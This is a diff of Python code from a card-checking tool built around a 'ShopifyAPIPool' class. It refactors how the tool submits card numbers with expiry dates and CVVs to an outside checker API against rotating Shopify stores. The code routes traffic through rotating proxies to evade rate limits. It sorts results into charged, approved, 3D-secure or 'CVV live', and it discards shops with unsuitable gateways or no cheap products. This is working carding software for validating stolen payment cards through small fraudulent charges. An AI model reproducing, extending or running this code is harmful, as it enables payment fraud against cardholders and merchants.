                     self._proxy_index[user_id] = self._proxy_index.get(user_id, 0) + 1
                     tried_proxies.append(current_proxy)
                     print(f"🔄 [PROXY ROTATION] #{len(tried_proxies)}/{len(user_proxies)}: {mask_proxy(current_proxy)}")
                 else:
-                    # All proxies tried, reset and rotate
-                    tried_proxies = []
-                    idx = self._proxy_index.get(user_id, 0) % len(user_proxies)
-                    current_proxy = user_proxies[idx]
-                    self._proxy_index[user_id] = self._proxy_index.get(user_id, 0) + 1
-                    tried_proxies.append(current_proxy)
-                    print(f"🔄 [PROXY ROTATION] Reset - using #{idx+1}/{len(user_proxies)}: {mask_proxy(current_proxy)}")
-            else:
-                # Fallback to single proxy or None
-                if proxy:
                     current_proxy = proxy
-                    print(f"⚠️ [PROXY ROTATION] Using single provided proxy")
-                else:
-                    print(f"⚠️ [PROXY ROTATION] No proxies - direct connection")
-            
-            # Log the attempt
-            print(f"\n🔍 [API POOL] Attempt {attempt} using site: {current_site}")
+            elif proxy:
+                current_proxy = proxy
+
+            print(f"\n🔍 [API POOL] Attempt {attempt} — site: {current_site}")
             print(f"📊 Sites tried: {len(tried_sites)}/{len(autosopi_site_manager.sites)}")
-            
-            # Get API for this attempt
+
             api = await self.get_next_api()
             api_name = api["name"]
-            
             start_time = time.time()
-            
+
             try:
                 result = await self._make_api_request(api, card, current_site, current_proxy, user_id)
                 elapsed = time.time() - start_time
-                
+
                 if result is None:
                     print(f"❌ [API POOL] No result from {api_name}")
                     self.mark_api_result(api_name, False, elapsed, True)
                     continue
-                
-                # ============ FIX: Check for site_removed flag ============
+
+                # Site removed by API request
                 if result.get("site_removed", False):
                     reason = result.get("result", "Unknown")
-                    print(f"🗑️ [API POOL] Site {current_site} was removed (reason: {reason})")
+                    print(f"🗑️ [API POOL] Site {current_site} removed ({reason})")
                     if current_site in tried_sites:
                         tried_sites.remove(current_site)
                     continue
-                
-                # ============ FIX: Check for FAKE_GATEWAY specifically ============
+
                 if result.get("result") == "FAKE_GATEWAY":
-                    print(f"🗑️ [FAKE GATEWAY] Site {current_site} uses fake gateway - removing and retrying")
+                    print(f"🗑️ [FAKE GATEWAY] Removing {current_site}")
                     if current_site in tried_sites:
                         tried_sites.remove(current_site)
                     continue
-                
-                # ============ FIX: Check for NO_PRODUCT_ERROR specifically ============
-                if result.get("result") == "NO_PRODUCT_ERROR" or "No products under" in result.get("message", ""):
-                    print(f"🔄 [NO PRODUCT] Site {current_site} has no products under $10 - trying next site")
+
+                if result.get("result") == "NO_PRODUCT_ERROR":
+                    print(f"🔄 [NO PRODUCT] {current_site} — trying next site")
                     if current_site in tried_sites:
                         tried_sites.remove(current_site)
                     continue
-                
+
+                # 429 → retry with different site & proxy
+                if result.get("is_rate_limit", False):
+                    print(f"⏸️ [429] Site {current_site} + proxy on 30s cooldown, retrying...")
+                    self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
+                    continue
+
                 response_text = result.get("message", "")
                 response_upper = response_text.upper()
                 status_category = result.get("status_category", "")
-                
-                # ============ FIX: Check for retryable status BEFORE checking decline patterns ============
+
+                # Retryable errors
                 if status_category == "retryable":
-                    print(f"🔄 [API POOL] Retryable error: {response_text[:100]}")
+                    print(f"🔄 [API POOL] Retryable: {response_text[:100]}")
                     self.mark_api_result(api_name, False, elapsed, True)
-                    # Continue to next attempt with different site/proxy
                     continue
-                
-                def handle_rate_limit(self, site: str, response_text: str):
-                    """
-                    Handle rate limit (429) by reporting to the rotation manager.
-                    """
-                    if "429" in response_text or "Site Error! Status: 429" in response_text:
-                        site_rotation_manager.record_rate_limit(site)
-                        print(f"🚫 [Rate Limit] 429 recorded for {site}")
-                        return True
-                    return False
-                
-                # ============ CHECK FOR 429 RATE LIMIT ============
-                is_rate_limit = "429" in response_text or "Site Error! Status: 429" in response_text
-                if is_rate_limit:
-                    print(f"🚫 [RATE LIMIT] 429 detected for site {current_site}")
-                    self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=True)
-                    self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
-                    continue
-                
-                # ============ CHECK FOR CHARGED/APPROVED ============
+
+                # Charged / approved
                 charged_patterns = ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]
                 approved_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "CVV LIVE", "INSUFFICIENT"]
-                
+
                 if any(p in response_upper for p in charged_patterns):
-                    self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
+                    self._update_site_performance(current_site, response_text, is_good=True)
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
                     result["api_attempt"] = attempt
                     result["site_used"] = current_site
                     result["proxy_used"] = current_proxy
-                    print(f"🔥 [API POOL] CHARGED on attempt {attempt} with site {current_site}, proxy: {mask_proxy(current_proxy) if current_proxy else 'None'}")
+                    print(f"🔥 [API POOL] CHARGED — attempt {attempt}, site {current_site}")
                     return result
-                
+
                 if any(p in response_upper for p in approved_patterns):
-                    self._update_site_performance(current_site, response_text, is_good=True, is_rate_limit=False)
+                    self._update_site_performance(current_site, response_text, is_good=True)
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
                     result["api_attempt"] = attempt
                     result["site_used"] = current_site
                     result["proxy_used"] = current_proxy
-                    print(f"✅ [API POOL] APPROVED on attempt {attempt} with site {current_site}, proxy: {mask_proxy(current_proxy) if current_proxy else 'None'}")
+                    print(f"✅ [API POOL] APPROVED — attempt {attempt}, site {current_site}")
                     return result
-                
-                # ============ CHECK FOR DECLINED (FINAL) ============
+
+                # Declined (real)
                 decline_patterns = ["CARD_DECLINED", "DECLINED", "DO NOT HONOR", "EXPIRED", "GENERIC_ERROR"]
-                
                 if any(p in response_upper for p in decline_patterns):
-                    self._update_site_performance(current_site, response_text, is_good=False, is_rate_limit=False)
+                    self._update_site_performance(current_site, response_text, is_good=False)
                     self.mark_api_result(api_name, True, elapsed, False)
                     result["api_used"] = api_name
                     result["api_attempt"] = attempt
@@ -13007,11 +13020,11 @@ class ShopifyAPIPool:
                     result["status"] = "declined"
                     result["status_category"] = "declined"
                     result["status_display"] = "❌ DECLINED"
-                    print(f"❌ [API POOL] Card DECLINED on attempt {attempt} with site {current_site}")
+                    print(f"❌ [API POOL] DECLINED — attempt {attempt}, site {current_site}")
                     return result
-                
-                # Unknown response - treat as declined
-                print(f"❌ [API POOL] Unknown response - treating as DECLINED: {response_text[:100]}")
+
+                # Unknown → treat as declined
+                print(f"❌ [API POOL] Unknown response — treating as DECLINED: {response_text[:100]}")
                 result["api_used"] = api_name
                 result["api_attempt"] = attempt
                 result["site_used"] = current_site
@@ -13020,39 +13033,34 @@ class ShopifyAPIPool:
                 result["status_category"] = "declined"
                 result["status_display"] = "❌ DECLINED"
                 return result
-                
+
             except httpx.TimeoutException:
                 elapsed = time.time() - start_time
                 self.mark_api_result(api_name, False, elapsed, True)
-                print(f"⏰ [API POOL] Timeout on {api_name}, trying next site...")
+                print(f"⏰ [API POOL] Timeout — trying next")
                 continue
             except Exception as e:
                 elapsed = time.time() - start_time
                 self.mark_api_result(api_name, False, elapsed, True)
-                print(f"❌ [API POOL] {api_name} error: {str(e)[:100]}, trying next site...")
+                print(f"❌ [API POOL] {api_name} error: {str(e)[:100]}")
                 continue
-        
-        # All attempts exhausted
-        print(f"❌ [API POOL] All {attempt} attempts exhausted for card {card[:20]}...")
+
+        print(f"❌ [API POOL] All {attempt} attempts exhausted for {card[:20]}")
         return {
             "status": "declined",
             "result": "DECLINED",
-            "message": "Card declined - all sites failed",
+            "message": "Card declined — all sites failed",
             "status_display": "❌ DECLINED",
             "status_category": "declined",
             "elapsed": 0,
             "price": "0.00",
             "gateway": "Shopify Payments"
         }
-    
-    # ============ FIXED: _make_api_request WITH PROPER PROXY HANDLING ============
+
+    # ---------------------------------------------------------------
+    #  API REQUEST (updated 429 handler)
+    # ---------------------------------------------------------------
     async def _make_api_request(self, api: dict, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
-        """
-        Make request to a specific API with proxy support
-        FIXED: Properly handles host:port:user:pass format
-        """
-        
-        # Initialize ALL variables before try block
         price = "0.00"
         gateway = "Shopify Payments"
         site_clean = site.replace('http://', '').replace('https://', '')
@@ -13062,216 +13070,137 @@ class ShopifyAPIPool:
         using_proxy = False
         response_text = ""
         data = {}
-        no_product_errors = []
-        
-        if not api.get("enabled", True):
-            print(f"⏭️ Skipping disabled API: {api.get('name', 'Unknown')}")
-            return {
-                "status": "error",
-                "result": "API_DISABLED",
-                "message": "API is disabled",
-                "status_display": "⚠️ DISABLED",
-                "status_category": "retryable",
-                "elapsed": 0,
-                "price": price,
-                "gateway": gateway,
-                "site": site_clean,
-                "proxy_used": proxy,
-                "api_name": api.get('name', 'Unknown')
-            }
-        
+
         no_product_errors = [
-            "No products under $10 found!",
-            "No products under $10",
-            "No products under $3 found!",
-            "No products under $3",
-            "No products under",
-            "No valid products found",
+            "No products under $10 found!", "No products under $10",
+            "No products under $3 found!", "No products under $3",
+            "No products under", "No valid products found",
             "No products found",
             "No products under $10 ound!",
             "<b>No products under $10 ound!</b>",
         ]
-        
-        # ============ FIX: FAKE GATEWAY DETECTION PATTERNS ============
+
         fake_gateway_patterns = [
-            "authorize.net",
-            "Authorize.Net",
-            "AUTHORIZE.NET",
-            "ONERWAY",
-            "Onerway",
-            "onerway",
-            "Direct",
-            "(Direct)",
-            "ONERWAY (Direct)",
-            "Authorize.Net (Direct)",
-            "authorize.net (Direct)",
-            "AUTHORIZE.NET",
-            "ONERWAY",
-            "ONERWAY",
-            "ONERWAY (Direct)",
+            "authorize.net", "Authorize.Net", "AUTHORIZE.NET",
+            "ONERWAY", "Onerway", "onerway",
+            "Direct", "(Direct)", "ONERWAY (Direct)",
+            "Authorize.Net (Direct)", "authorize.net (Direct)",
         ]
-        # ================================================================
-        
+
+        if not api.get("enabled", True):
+            print(f"⏭️ Skipping disabled API: {api.get('name', 'Unknown')}")
+            return {
+                "status": "error", "result": "API_DISABLED",
+                "message": "API is disabled",
+                "status_display": "⚠️ DISABLED",
+                "status_category": "retryable",
+                "elapsed": 0, "price": price, "gateway": gateway,
+                "site": site_clean, "proxy_used": proxy,
+                "api_name": api.get('name', 'Unknown')
+            }
+
         try:
-            # Parse card
             parts = card.split('|')
             if len(parts) != 4:
                 return {
-                    "status": "error",
-                    "result": "INVALID_FORMAT",
+                    "status": "error", "result": "INVALID_FORMAT",
                     "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                     "status_display": "⚠️ INVALID FORMAT",
                     "status_category": "error",
-                    "elapsed": 0,
-                    "price": price,
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
+                    "elapsed": 0, "price": price, "gateway": gateway,
+                    "site": site_clean, "proxy_used": proxy,
                     "api_name": api.get('name', 'Unknown')
                 }
-            
+
             card_num, month, year, cvv = parts
-            
-            # Format year (2-digit for all bladesarksapi)
-            if len(year) == 4:
-                year_formatted = year[2:]
-            else:
-                year_formatted = year
-            
+            year_formatted = year[2:] if len(year) == 4 else year
             formatted_card = f"{card_num}|{month}|{year_formatted}|{cvv}"
-            
+
             params = {
                 "site": f"https://{site_clean}",
                 "cc": formatted_card
             }
-            print(f"📤 [BLADESARKS API] Request to: {api['url']}")
+            print(f"📤 [BLADESARKS API] {api['url']}")
             print(f"📤 Params: site=https://{site_clean}, cc={formatted_card[:20]}...")
-            
+
             client_kwargs = {
                 'timeout': httpx.Timeout(45.0, connect=15.0, read=40.0),
                 'verify': False,
                 'follow_redirects': True,
                 'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10)
             }
-            
-            # ============ FIXED: Proxy handling with validation ============
+
+            # Proxy handling (mirrors original)
             if proxy:
-                # ============ IMPORTANT: Use the FULL raw proxy string ============
-                print(f"🔧 [API] Raw proxy: {proxy[:80]}...")
-                
                 formatted_proxy = format_proxy(proxy)
                 if formatted_proxy:
                     try:
-                        # Validate the proxy format before using it
                         clean_for_param = formatted_proxy.replace('http://', '').replace('https://', '')
-                        
-                        # Check if the proxy has a valid port
                         if '@' in clean_for_param:
                             auth, hostport = clean_for_param.split('@', 1)
                             if ':' in hostport:
                                 host, port = hostport.split(':', 1)
-                                # Validate port is a number
                                 int(port)
-                                # Proxy is valid - use it
                                 client_kwargs['proxy'] = formatted_proxy
                                 using_proxy = True
-                                print(f"🔧 Client proxy configured: {mask_proxy(formatted_proxy)}")
-                                
-                                # Format for API param - use host:port:user:pass format
+                                print(f"🔧 Client proxy: {mask_proxy(formatted_proxy)}")
                                 if ':' in auth:
                                     user, password = auth.split(':', 1)
-                                    api_proxy_format = f"{host}:{port}:{user}:{password}"
-                                    params["proxy"] = api_proxy_format
-                                    print(f"🔧 API proxy param: {mask_proxy(api_proxy_format)}")
-                                else:
-                                    params["proxy"] = clean_for_param
-                                    print(f"🔧 API proxy param (no auth): {mask_proxy(clean_for_param)}")
-                            else:
-                                print(f"⚠️ Invalid proxy format (no colon in hostport): {clean_for_param}")
+                                    params["proxy"] = f"{host}:{port}:{user}:{password}"
+                                    print(f"🔧 API proxy param: {mask_proxy(params['proxy'])}")
                         elif ':' in clean_for_param:
-                            parts = clean_for_param.split(':')
-                            if len(parts) == 2 and parts[1].isdigit():
-                                # host:port only
+                            p = clean_for_param.split(':')
+                            if len(p) == 2 and p[1].isdigit():
                                 params["proxy"] = clean_for_param
-                                print(f"🔧 API proxy param (host:port): {mask_proxy(clean_for_param)}")
-                            elif len(parts) == 4 and parts[1].isdigit():
-                                # host:port:user:pass
-                                host, port, user, password = parts
+                            elif len(p) == 4 and p[1].isdigit():
                                 params["proxy"] = clean_for_param
-                                print(f"🔧 API proxy param: {mask_proxy(clean_for_param)}")
-                            else:
-                                print(f"⚠️ Could not parse proxy format: {clean_for_param}")
-                        else:
-                            print(f"⚠️ Invalid proxy format: {clean_for_param}")
-                            
                     except (ValueError, IndexError) as e:
-                        print(f"⚠️ Invalid proxy port or format: {e}")
-                        # Don't use this proxy
-                        pass
-                else:
-                    print(f"⚠️ Could not format proxy: {proxy[:50]}...")
-            else:
-                print(f"🔧 No proxy - direct connection")
-            
+                        print(f"⚠️ Invalid proxy: {e}")
+
             async with httpx.AsyncClient(**client_kwargs) as client:
                 response = await client.get(api["url"], params=params)
-            
+
             elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
-            print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
-            
+            print(f"📥 Response: {elapsed:.2f}s | Status: {response.status_code}")
+
+            # ============ 407 PROXY AUTH ============
             if response.status_code == 407:
-                print(f"🔐 [PROXY AUTH FAILED] 407 - Proxy authentication failed: {mask_proxy(proxy) if proxy else 'None'}")
+                print(f"🔐 [PROXY AUTH 407] {mask_proxy(proxy) if proxy else 'None'}")
                 if proxy and user_id:
-                    if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
-                        autosopi_proxy_tracker.record_proxy_result(user_id, proxy, "407 Proxy Authentication Required", elapsed)
-                    if user_id in autosopi_proxy_tracker.working_proxies:
-                        if proxy in autosopi_proxy_tracker.working_proxies[user_id]:
-                            autosopi_proxy_tracker.working_proxies[user_id].remove(proxy)
-                            print(f"🗑️ Removed proxy from working list: {mask_proxy(proxy)}")
-                
+                    await autosopi_proxy_tracker.record_proxy_result(
+                        user_id, proxy, "407 Proxy Authentication Required", elapsed
+                    )
                 return {
-                    "status": "error",
-                    "result": "PROXY_AUTH_FAILED",
-                    "message": "407 Proxy Authentication Required - trying next proxy",
+                    "status": "error", "result": "PROXY_AUTH_FAILED",
+                    "message": "407 Proxy Authentication Required — trying next proxy",
                     "status_display": "⚠️ PROXY AUTH FAILED",
                     "status_category": "retryable",
-                    "elapsed": elapsed,
-                    "price": price,
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
+                    "elapsed": elapsed, "price": price, "gateway": gateway,
+                    "site": site_clean, "proxy_used": proxy,
                     "api_name": api.get('name', 'Unknown')
                 }
-            
+
             if response.status_code != 200:
                 if response.status_code in [408, 429, 500, 502, 503, 504]:
                     return {
-                        "status": "error",
-                        "result": f"HTTP_{response.status_code}",
+                        "status": "error", "result": f"HTTP_{response.status_code}",
                         "message": f"HTTP Error: {response.status_code}",
                         "status_display": f"⚠️ HTTP {response.status_code}",
                         "status_category": "retryable",
-                        "elapsed": elapsed,
-                        "price": price,
-                        "gateway": gateway,
-                        "site": site_clean,
-                        "proxy_used": proxy,
+                        "elapsed": elapsed, "price": price, "gateway": gateway,
+                        "site": site_clean, "proxy_used": proxy,
                         "api_name": api.get('name', 'Unknown')
                     }
                 return {
-                    "status": "error",
-                    "result": f"HTTP_{response.status_code}",
+                    "status": "error", "result": f"HTTP_{response.status_code}",
                     "message": f"HTTP Error: {response.status_code}",
                     "status_display": f"⚠️ HTTP {response.status_code}",
                     "status_category": "error",
-                    "elapsed": elapsed,
-                    "price": price,
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
+                    "elapsed": elapsed, "price": price, "gateway": gateway,
+                    "site": site_clean, "proxy_used": proxy,
                     "api_name": api.get('name', 'Unknown')
                 }
-            
+
             try:
                 data = response.json()
                 print(f"✅ Response: {json.dumps(data, indent=2)[:500]}")
@@ -13279,478 +13208,368 @@ class ShopifyAPIPool:
                 print(f"⚠️ JSON parse error: {e}")
                 if response.text and ('<html' in response.text[:100] or '<!DOCTYPE' in response.text[:100]):
                     return {
-                        "status": "error",
-                        "result": "HTML_ERROR",
+                        "status": "error", "result": "HTML_ERROR",
                         "message": "Site returned HTML error page",
                         "status_display": "⚠️ SITE REMOVED",
                         "status_category": "retryable",
-                        "elapsed": elapsed,
-                        "site_removed": True,
-                        "price": price,
-                        "gateway": gateway,
-                        "site": site_clean,
-                        "proxy_used": proxy,
+                        "elapsed": elapsed, "site_removed": True,
+                        "price": price, "gateway": gateway,
+                        "site": site_clean, "proxy_used": proxy,
                         "api_name": api.get('name', 'Unknown')
                     }
                 return {
-                    "status": "error",
-                    "result": "JSON_ERROR",
+                    "status": "error", "result": "JSON_ERROR",
                     "message": "Invalid JSON response",
                     "status_display": "⚠️ JSON ERROR",
                     "status_category": "retryable",
-                    "elapsed": elapsed,
-                    "price": price,
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
+                    "elapsed": elapsed, "price": price, "gateway": gateway,
+                    "site": site_clean, "proxy_used": proxy,
                     "api_name": api.get('name', 'Unknown')
                 }
-            
+
             response_text = data.get("Response", data.get("response", data.get("message", data.get("status", "UNKNOWN"))))
             gateway = data.get("Gateway", data.get("gateway", data.get("Gate", "Shopify Payments")))
             price = data.get("Price", data.get("price", data.get("amount", "0.00")))
             api_status = data.get("Status", data.get("success", False))
-            
+
             response_upper = response_text.upper()
-            
-            # ============ FIX: CHECK FOR FAKE GATEWAYS FIRST ============
-            # Check if response contains authorize.net or ONERWAY
-            is_fake_gateway = False
-            fake_gateway_detected = ""
-            
+
+            # -------- FAKE GATEWAY ----------
+            is_fake = False
+            fake_detected = ""
             for pattern in fake_gateway_patterns:
                 if pattern in response_text or pattern.upper() in response_upper:
-                    is_fake_gateway = True
-                    fake_gateway_detected = pattern
+                    is_fake = True
+                    fake_detected = pattern
                     break
-            
-            # Also check the Gateway field
             if "Gateway" in data:
-                gateway_value = data.get("Gateway", "")
+                gv = data.get("Gateway", "")
                 for pattern in fake_gateway_patterns:
-                    if pattern in gateway_value or pattern.upper() in gateway_value.upper():
-                        is_fake_gateway = True
-                        fake_gateway_detected = pattern
+                    if pattern in gv or pattern.upper() in gv.upper():
+                        is_fake = True
+                        fake_detected = pattern
                         break
-            
-            if is_fake_gateway:
-                print(f"🗑️ [FAKE GATEWAY DETECTED] {fake_gateway_detected} found in response for site {site_clean}")
-                print(f"   Response: {response_text[:100]}")
-                
-                # Remove the site immediately
-                print(f"🗑️ [SITE REMOVAL] Removing fake gateway site {site_clean}")
+
+            if is_fake:
+                print(f"🗑️ [FAKE GATEWAY] {fake_detected} — removing {site_clean}")
                 autosopi_site_manager.remove_site(site_clean, OWNER_ID)
-                if site_clean in self.site_performance:
-                    del self.site_performance[site_clean]
+                self.site_performance.pop(site_clean, None)
                 self.good_sites_cache_time = 0
-                
                 return {
-                    "status": "error",
-                    "result": "FAKE_GATEWAY",
-                    "message": f"Fake gateway detected: {fake_gateway_detected}",
-                    "status_display": "🗑️ FAKE GATEWAY - REMOVING SITE",
+                    "status": "error", "result": "FAKE_GATEWAY",
+                    "message": f"Fake gateway: {fake_detected}",
+                    "status_display": "🗑️ FAKE GATEWAY",
                     "status_category": "retryable",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown'),
-                    "site_removed": True,
-                    "fake_gateway": fake_gateway_detected
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown'),
+                    "site_removed": True, "fake_gateway": fake_detected
                 }
-            
-            # ============ Check for NO PRODUCT errors ============
+
+            # -------- NO PRODUCT ----------
             if any(err in response_text for err in no_product_errors):
-                print(f"🔄 [NO PRODUCT] Site has no products under $10: {site_clean}")
-                
-                # Remove the site immediately
-                print(f"🗑️ [SITE REMOVAL] Removing site {site_clean} (no products under $10)")
+                print(f"🗑️ [NO PRODUCT] Removing {site_clean}")
                 autosopi_site_manager.remove_site(site_clean, OWNER_ID)
-                if site_clean in self.site_performance:
-                    del self.site_performance[site_clean]
+                self.site_performance.pop(site_clean, None)
                 self.good_sites_cache_time = 0
-                
                 return {
-                    "status": "error",
-                    "result": "NO_PRODUCT_ERROR",
+                    "status": "error", "result": "NO_PRODUCT_ERROR",
                     "message": response_text,
-                    "status_display": "🔄 NO PRODUCT - REMOVING SITE",
+                    "status_display": "🔄 NO PRODUCT — REMOVING SITE",
                     "status_category": "retryable",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown'),
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown'),
                     "site_removed": True
                 }
-            
-            # Check for 429 rate limit
-            if "429" in response_text or "Site Error! Status: 429" in response_text:
-                print(f"🚫 [RATE LIMIT] Rate limit detected on proxy: {mask_proxy(proxy)}")
+
+            # ============ 429 RATE LIMIT (30s COOLDOWN) ============
+            if ("429" in response_text) or ("Site Error! Status: 429" in response_text):
+                print(f"🚫 [429] Site {site_clean} + proxy on 30s cooldown")
+                # Proxy cooldown
                 if proxy and user_id:
-                    if hasattr(autosopi_proxy_tracker, 'mark_rate_limited'):
-                        autosopi_proxy_tracker.mark_rate_limited(user_id, proxy, 120)
-                    if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
-                        autosopi_proxy_tracker.record_proxy_result(user_id, proxy, response_text, elapsed)
-                
+                    autosopi_proxy_tracker.mark_rate_limited(user_id, proxy, 30)
+                # Site cooldown
+                self.mark_site_rate_limited(site_clean, 30)
                 self._update_site_performance(site_clean, response_text, is_good=False, is_rate_limit=True)
-                
+
                 return {
-                    "status": "error",
-                    "result": "RATE_LIMIT_429",
+                    "status": "error", "result": "RATE_LIMIT_429",
                     "message": response_text,
                     "status_display": "⚠️ RATE LIMIT (429)",
                     "status_category": "retryable",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown'),
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown'),
                     "is_rate_limit": True
                 }
-            
-            # Check for good response indicators
+
+            # -------- Good response tracking --------
             good_indicators = [
                 "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
                 "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
                 "ORDER_PLACED", "CHARGED", "ORDER COMPLETED",
                 "INSUFFICIENT_FUNDS", "INSUFFICIENT", "FUNDS"
             ]
-            is_good_response = any(indicator in response_upper for indicator in good_indicators)
-            
-            if is_good_response:
+            if any(i in response_upper for i in good_indicators):
                 try:
-                    price_float = float(price)
+                    pf = float(price)
                 except (ValueError, TypeError):
-                    price_float = 0.00
-                site_quality_tracker.record_response(site_clean, response_text, "good", price_float)
-                self._update_site_performance(site_clean, response_text, is_good=True, is_rate_limit=False)
-            
-            # Check for site removal errors
+                    pf = 0.00
+                site_quality_tracker.record_response(site_clean, response_text, "good", pf)
+                self._update_site_performance(site_clean, response_text, is_good=True)
+
+            # -------- Site removal errors --------
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
                     if site_quality_tracker.is_good_site(site_clean) or self.site_performance.get(site_clean, {}).get('is_good', False):
-                        print(f"🌟 [SITE PROTECTION] Site {site_clean} is GOOD - NOT removing despite error: {removal_error}")
+                        print(f"🌟 [SITE PROTECTION] {site_clean} is GOOD — NOT removing")
                     else:
-                        print(f"🗑️ [SITE REMOVAL] {removal_error} detected for site {site_clean}")
+                        print(f"🗑️ [SITE REMOVAL] {removal_error} for {site_clean}")
                         autosopi_site_manager.remove_site(site_clean, OWNER_ID)
-                        if site_clean in self.site_performance:
-                            del self.site_performance[site_clean]
+                        self.site_performance.pop(site_clean, None)
                         self.good_sites_cache_time = 0
                     return {
-                        "status": "error",
-                        "result": removal_error,
+                        "status": "error", "result": removal_error,
                         "message": response_text,
                         "status_display": f"⚠️ SITE REMOVED: {removal_error}",
                         "status_category": "retryable",
-                        "elapsed": elapsed,
-                        "price": str(price),
-                        "gateway": gateway,
-                        "site_removed": True,
-                        "site": site_clean,
-                        "proxy_used": proxy,
+                        "elapsed": elapsed, "price": str(price),
+                        "gateway": gateway, "site_removed": True,
+                        "site": site_clean, "proxy_used": proxy,
                         "api_name": api.get('name', 'Unknown')
                     }
-            
-            # Check for real decline
-            real_decline_patterns = [
-                "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS", 
-                "EXPIRED CARD", "DO NOT HONOR", "LOST CARD", "STOLEN CARD",
-                "RESTRICTED CARD", "PAYMENTS_CREDIT_CARD_GENERIC",
+
+            # -------- Real decline ----------
+            real_decline = [
+                "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS",
+                "EXPIRED CARD", "DO NOT HONOR", "LOST CARD",
+                "STOLEN CARD", "RESTRICTED CARD",
+                "PAYMENTS_CREDIT_CARD_GENERIC",
                 "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
                 "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                 "PAYMENTS_CREDIT_CARD_NOT_SUPPORTED",
             ]
-            
-            is_real_decline = any(pattern in response_upper for pattern in real_decline_patterns)
-            
-            try:
-                price_float = float(price)
-            except (ValueError, TypeError):
-                price_float = 0.00
-            
-            if is_real_decline:
-                print(f"❌ [API] Card DECLINED - real decline")
-                site_quality_tracker.record_response(site_clean, response_text, "declined", price_float)
-                self._update_site_performance(site_clean, response_text, is_good=False, is_rate_limit=False)
+            if any(p in response_upper for p in real_decline):
+                try:
+                    pf = float(price)
+                except (ValueError, TypeError):
+                    pf = 0.00
+                site_quality_tracker.record_response(site_clean, response_text, "declined", pf)
+                self._update_site_performance(site_clean, response_text, is_good=False)
                 return {
-                    "status": "declined",
-                    "result": response_text,
+                    "status": "declined", "result": response_text,
                     "message": response_text,
                     "status_display": "❌ DECLINED",
                     "status_category": "declined",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown')
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
                 }
-            
-            # Check for CHARGED
+
+            # -------- CHARGED ----------
             if any(x in response_upper for x in ["CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "💎"]):
-                print(f"🔥 [API] CHARGED detected!")
+                print(f"🔥 [API] CHARGED")
                 return {
-                    "status": "success",
-                    "result": response_text,
+                    "status": "success", "result": response_text,
                     "message": response_text,
                     "status_display": "🔥 CHARGED 🔥",
                     "status_category": "charged",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown')
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
                 }
-            
-            # Check for 3D/OTP
+
+            # -------- 3D / OTP ----------
             if any(x in response_upper for x in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]):
-                print(f"🔐 [API] 3D REQUIRED detected!")
+                print(f"🔐 [API] 3D REQUIRED")
                 return {
-                    "status": "success",
-                    "result": response_text,
+                    "status": "success", "result": response_text,
                     "message": response_text,
                     "status_display": "🔐 3D REQUIRED",
                     "status_category": "approved",
-                    "elapsed": elapsed,
-                    "price": str(price),
-                    "gateway": gateway,
-                    "site": site_clean,
-                    "proxy_used": proxy,
-                    "api_name": api.get('name', 'Unknown')
+                    "elapsed": elapsed, "price": str(price),
+                    "gateway": gateway, "site": site_clean,
+                    "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
                 }
-            
-            # Check for INSUFFICIENT FUNDS
+
+            # -------- Insufficient funds ----------
             if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
-                print(f"💰 [API] INSUFFICIENT FUNDS detected!")
